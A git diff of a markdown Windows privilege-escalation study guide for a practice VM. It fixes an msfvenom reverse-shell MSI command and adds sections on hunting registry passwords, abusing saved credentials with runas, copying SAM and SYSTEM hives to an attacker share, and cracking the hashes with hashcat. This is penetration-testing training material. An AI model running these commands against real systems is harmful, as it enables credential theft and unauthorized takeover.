@@ -7,6 +7,8 @@ A couple of golden resources that you need to be aware of and should be referenc
 - [Sushant's Blog](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
 - [YouTube Link - Sagi Shahar](https://www.youtube.com/results?search_query=sagi+shahar)  
 
+\
+\
 
 
 ### Reverse Shell - Couple of Methods
@@ -39,6 +41,8 @@ Replace 10.10.10.10 with whatever IP the attach machine has.
 
 And then run the reverse.exe file on the victim machine
 
+\
+\
 
 
 2. **Method2** Generating a Powershell session by invoking Nishang's Reverse Shell into the memory directly
@@ -58,10 +62,11 @@ Here is how we do it.
 
 In here we are generating an EXE file which then needs to be run at the target box.
 
-
-
-
-
+\
+\
+\
+\
+\
 
 
 ### Escalation Path 1 - Kernel Exploits
@@ -86,6 +91,10 @@ https://github.com/SecWiki/windows-kernel-exploits
 
 4. See the methodology to get an escalated session and escalate privileges
 
+\
+\
+\
+\
 
 
 
@@ -121,10 +130,10 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start daclsvc**
 
-  
-
-
-
+\
+\
+\
+\
 
 
 
@@ -157,12 +166,11 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start unquotedsvc**
 
-  
-
-
-
-
-
+ \
+ \
+\
+\
+\
 
 
 
@@ -193,7 +201,11 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start regsvc**
   
-  
+\
+\
+\
+\
+
   
   
 
@@ -224,7 +236,11 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start filepermsvc**
 
- 
+ \
+ \
+ \
+ \
+
 
 
 
@@ -253,6 +269,12 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 **Step 4:** Restart the box (if this is possible in the scenario provided and then wait for someone to log in!!)
 
 
+\
+\
+\
+\
+
+
 
 
 ### Escalation Path 7 - Registry (AllAlwaysInstallElevated)
@@ -270,7 +292,7 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 **Step 3:** On Kali generate a msi based reverse shell file using
 
-> ** msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f msi -o reverse.msi**
+> **msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f msi -o reverse.msi**
 
 
 **Step 4:** Transfer this reverse.msi file onto the Windows box
@@ -281,7 +303,80 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **msiexec /quiet /qn /i C:\PrivEsc\reverse.msi**
 
+\
+\
+\
+\
 
+
+
+### Escalation Path 8 - Passwords Registry
+---
+
+The registry can be searched for keys and values that contain the word "password":
+
+> **reg query HKLM /f password /t REG_SZ /s**
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+
+> **reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"**
+
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+> **winexe -U 'admin%password' //MACHINE_IP cmd.exe**
+
+\
+\
+\
+\
+
+### Escalation Path 9 - Password Saved Creds
+---
+
+
+List any saved credentials:
+
+> **cmdkey /list**
+
+Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
+
+Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
+
+> **runas /savecred /user:admin C:\PrivEsc\reverse.exe**
+
+\
+\
+\
+\
+
+
+
+### Escalation Path 10 - SAM
+---
+
+
+The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
+
+Transfer the SAM and SYSTEM files to your Kali VM:
+
+```
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+```
+
+On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+
+```
+git clone https://github.com/Neohapsis/creddump7.git
+sudo apt install python-crypto
+python2 creddump7/pwdump.py SYSTEM SAM
+```
+
+Crack the admin NTLM hash using hashcat:
+
+> **hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt**
+
+You can use the cracked password to log in as the admin using winexe or RDP.
 
 
 
